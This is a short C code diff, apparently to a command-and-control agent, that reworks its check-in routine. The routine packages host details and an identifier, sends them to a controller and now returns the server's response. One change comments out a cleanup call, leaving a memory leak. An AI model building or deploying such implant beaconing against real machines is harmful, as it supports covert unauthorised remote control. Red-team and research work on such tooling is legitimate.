@@ -1,5 +1,5 @@
 #include "Checkin.h"
-
+#include "ceos.h"
 
 BYTE getArch()
 {
@@ -73,11 +73,11 @@ char* getOsName()
 	return (PCHAR)"Windows";
 }
 
-BOOL checkin()
+PParser checkin()
 {
 	PPackage checkin = newPackage(0, TRUE);
 	addByte(checkin, 0xf1);
-	addString(checkin, (PCHAR)uuid, FALSE);
+	addString(checkin, (PCHAR)getUUID(), FALSE);
 	addInt32(checkin, 1);
 	addString(checkin, (PCHAR)"192.168.50.1", TRUE);
 	
@@ -94,11 +94,11 @@ BOOL checkin()
 
 	Parser* ResponseParser = sendPackage(checkin);
 
-	freePackage(checkin);
+	//freePackage(checkin);
 
 	if (!ResponseParser)
-		return FALSE;
+		return NULL;
 
 	
-	return TRUE;
+	return ResponseParser;
 }
